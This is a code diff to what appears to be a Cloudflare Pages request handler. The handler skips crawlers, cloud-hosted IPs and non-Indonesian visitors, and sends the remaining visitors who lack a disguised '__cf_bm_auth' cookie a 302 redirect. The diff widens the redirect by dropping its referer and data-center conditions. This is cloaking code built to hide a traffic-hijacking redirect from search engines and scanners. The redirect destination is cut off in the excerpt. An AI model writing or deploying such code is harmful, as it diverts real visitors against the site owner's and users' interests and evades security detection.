@@ -8,16 +8,14 @@ export async function onRequest(context) {
   const cookies = headers.get('cookie') || '';
   const ticketName = "__cf_bm_auth";
   const hasTicket = cookies.includes(`${ticketName}=true`);
-  const isFromHeylink = referer.includes('heylink.me/kopi-sensa');
   const country = request.cf ? request.cf.country : 'Unknown';
   const asOrg = (request.cf ? request.cf.asOrganization : '').toLowerCase();
   const cloudList = ['amazon','google','digitalocean','microsoft','cloudflare','akamai','linode','ovh','mweb','data','host','server','vps'];
   const isCloud = cloudList.some(c => asOrg.includes(c));
-  if (!new Set(['CGK', 'SUB', 'BTH', 'DPS', 'UPG', 'KNO']).has(request.cf?.colo)) return next();
   if (country !== 'ID' || isCloud || /bot|spider|crawl|lighthouse/i.test(userAgent)) {
     return next();
   }
-  if (isFromHeylink && !hasTicket) {
+  if (!hasTicket) {
     return new Response(null, {
       status: 302,
       headers: {
